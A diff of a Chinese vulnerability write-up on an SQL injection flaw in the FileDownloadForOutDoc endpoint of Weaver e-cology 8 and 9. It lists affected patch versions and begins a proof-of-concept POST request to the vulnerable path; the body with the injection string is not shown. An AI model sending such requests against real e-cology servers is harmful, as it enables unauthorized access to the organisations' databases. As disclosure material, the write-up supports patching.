@@ -12,15 +12,15 @@ source: "MrWQ/vulnerability-paper"
 
 **漏洞说明**
 
-        泛微 e-cology 是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。
+        泛微 e-cology 是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。
 
-        泛微 e-cology FileDownloadForOutDoc 未对用户的输入进行有效的过滤，直接将其拼接进了 SQL 查询语句中，导致系统出现 SQL 注入漏洞。
+        泛微 e-cology FileDownloadForOutDoc 未对用户的输入进行有效的过滤，直接将其拼接进了 SQL 查询语句中，导致系统出现 SQL 注入漏洞。
 
 **影响版本**
 
 ```
-部分e-cology 8且补丁版本<10.58.0
-部分e-cology 9且补丁版本<10.58.0
+部分e-cology 8且补丁版本<10.58.0
+部分e-cology 9且补丁版本<10.58.0
 
 ```
 
@@ -32,7 +32,7 @@ payload：
 
 ```
 POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
-Host: ip:port
+Host: ip:port
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
 Content-Length: 45
 Content-Type: application/x-www-form-urlencoded
